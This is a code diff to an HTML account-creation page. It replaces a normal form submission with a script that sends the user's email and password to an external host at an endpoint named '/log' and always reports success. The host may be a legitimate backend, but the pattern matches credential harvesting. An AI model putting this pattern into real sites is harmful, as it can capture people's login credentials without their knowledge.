@@ -59,16 +59,27 @@
             text-decoration: none;
         }
     </style>
+    <script>
+        async function createAccount(event) {
+            event.preventDefault();
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            const response = await fetch("https://duty-api.onrender.com/log", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ account: email, password: password })
+            });
+
+            const result = await response.json();
+            alert(result.message || "Account created successfully!");
+        }
+    </script>
 </head>
 <body>
-
     <div class="account-container">
         <h2>Create Account</h2>
-        <form action="/create-account" method="POST">
-            <div class="input-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" name="username" required>
-            </div>
+        <form onsubmit="createAccount(event)">
             <div class="input-group">
                 <label for="email">Email</label>
                 <input type="email" id="email" name="email" required>
@@ -85,6 +96,5 @@
             <p>Already have an account? <a href="/login">Login here</a></p>
         </div>
     </div>
-
 </body>
 </html>
